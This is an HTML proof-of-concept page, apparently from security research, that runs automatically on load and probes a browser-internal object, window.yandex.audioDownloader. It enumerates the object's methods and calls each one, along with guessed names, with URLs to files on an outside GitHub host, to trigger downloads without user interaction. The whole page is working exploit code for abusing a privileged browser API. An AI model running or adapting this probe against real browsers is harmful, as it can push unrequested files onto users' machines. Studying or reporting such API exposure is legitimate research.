<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>DJINI PoC - yandex.audioDownloader method discovery</title>

  <style>
    body {
      font-family: sans-serif;
      padding: 16px;
    }

    h1 {
      margin: 0 0 8px 0;
    }

    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #111;
      color: #0f0;
      padding: 12px;
      border-radius: 8px;
    }
  </style>
</head>

<body>
  <h1>DJINI PoC</h1>

  <div>
    Target: <code>window.yandex.audioDownloader</code> (auto-run)
  </div>

  <div>
    TS: <span id="ts"></span>
  </div>

  <pre id="out">Running...</pre>

  <script>
    (function () {
      document.getElementById('ts').textContent = String(Date.now());

      function out(s) {
        const el = document.getElementById('out');
        el.textContent += s + "\n";
      }

      function safe(v) {
        try {
          if (v === undefined) return 'undefined';
          if (v === null) return 'null';
          if (typeof v === 'string') return JSON.stringify(v);
          if (typeof v === 'number' || typeof v === 'boolean') return String(v);
          if (typeof v === 'function') return '[function ' + (v.name || 'anonymous') + ']';
          return String(v);
        } catch (e) {
          return '[unprintable:' + e + ']';
        }
      }

      function j(o) {
        try {
          return JSON.stringify(o);
        } catch (e) {
          return '[json_fail:' + e + ']';
        }
      }

      function ownKeys(o) {
        try {
          return Reflect.ownKeys(o);
        } catch (e) {
          return ['<ownKeys error ' + e + '>'];
        }
      }

      // Reset output
      document.getElementById('out').textContent = '';

      out('--- window.yandex ---');

      let y;
      try {
        y = window.yandex;
      } catch (e) {
        out('ERROR reading window.yandex: ' + e);
        y = undefined;
      }

      out('typeof window.yandex = ' + (typeof y) + ' ' + safe(y));

      if (!y) {
        out('No window.yandex present; stopping.');
        alert('No window.yandex present');
        return;
      }

      out('ownKeys(window.yandex) = ' + j(ownKeys(y).slice(0, 80)));

      out('\n--- audioDownloader descriptor ---');

      let desc;
      try {
        desc = Object.getOwnPropertyDescriptor(y, 'audioDownloader');
      } catch (e) {
        desc = { error: String(e) };
      }

      out('descriptor = ' + j(desc && {
        has: !!desc,
        enumerable: desc ? !!desc.enumerable : null,
        configurable: desc ? !!desc.configurable : null,
        writable: desc && ('writable' in desc) ? !!desc.writable : null,
        hasValue: desc ? ('value' in desc) : null,
        valueType: (desc && 'value' in desc) ? (typeof desc.value) : null,
        hasGet: !!(desc && typeof desc.get === 'function'),
        hasSet: !!(desc && typeof desc.set === 'function')
      }));

      out('\n--- window.yandex.audioDownloader ---');

      let ad;
      try {
        ad = y.audioDownloader;
      } catch (e) {
        out('ERROR reading y.audioDownloader: ' + e);
        ad = undefined;
      }

      out('typeof y.audioDownloader = ' + (typeof ad) + ' ' + safe(ad));

      if (!ad) {
        out('\nRESULT: audioDownloader is not bound (undefined/null) in this context.');
        alert('audioDownloader is not bound here (undefined/null).');
        return;
      }

      // Enumerate method surface
      out('\n--- audioDownloader keys ---');

      const keys = ownKeys(ad);
      out('ownKeys(audioDownloader) = ' + j(keys.slice(0, 200)));

      // Build candidate method list
      const fnNames = [];
      for (const k of keys) {
        try {
          if (typeof ad[k] === 'function') {
            fnNames.push(String(k));
          }
        } catch (e) {}
      }

      out('function keys = ' + j(fnNames));

      // Attempt non-interactive download triggers (best-effort)
      const testUrl = 'https://raw.githubusercontent.com/nmochea/whoami/refs/heads/main/poc.mp3';
      const altUrl = 'https://raw.githubusercontent.com/nmochea/whoami/refs/heads/main/poc.txt';
      const fileName = 'poc.mp3';
      const cd = 'attachment; filename="' + fileName + '"';
      const mime = 'audio/mpeg';

      const argSets = [
        [testUrl],
        [testUrl, fileName],
        [testUrl, fileName, mime],
        [testUrl, cd, mime],
        [testUrl, cd, mime, fileName],
        [altUrl, cd, 'text/plain', 'poc.txt'],
        [{ url: testUrl, filename: fileName, mime: mime }],
        [{ url: testUrl, contentDisposition: cd, mimeType: mime }]
      ];

      const likely = [
        'download', 'downloadAudio', 'downloadFile', 'save', 'saveFile',
        'start', 'startDownload', 'enqueue', 'add', 'request', 'fetch',
        'saveToFile', 'saveFromUrl', 'saveUrl'
      ];

      const callTargets = [];
      for (const name of fnNames) callTargets.push(name);
      for (const name of likely) {
        if (!callTargets.includes(name)) callTargets.push(name);
      }

      out('\n--- call attempts (non-interactive) ---');

      let anySuccess = false;

      for (const m of callTargets) {
        let f;
        try {
          f = ad[m];
        } catch (e) {
          continue;
        }

        if (typeof f !== 'function') continue;

        for (let i = 0; i < argSets.length; i++) {
          const args = argSets[i];
          try {
            const r = f.apply(ad, args);
            out('[OK] audioDownloader.' + m + ' args#' + i + ' returned: ' + safe(r));
            anySuccess = true;
          } catch (e) {
            out('[EX] audioDownloader.' + m + ' args#' + i + ' threw: ' + e);
          }
        }
      }

      out('\nRESULT anySuccess=' + anySuccess);
      alert('audioDownloader probe done. anySuccess=' + anySuccess + '. Check page output.');
    })();
  </script>
</body>
</html>
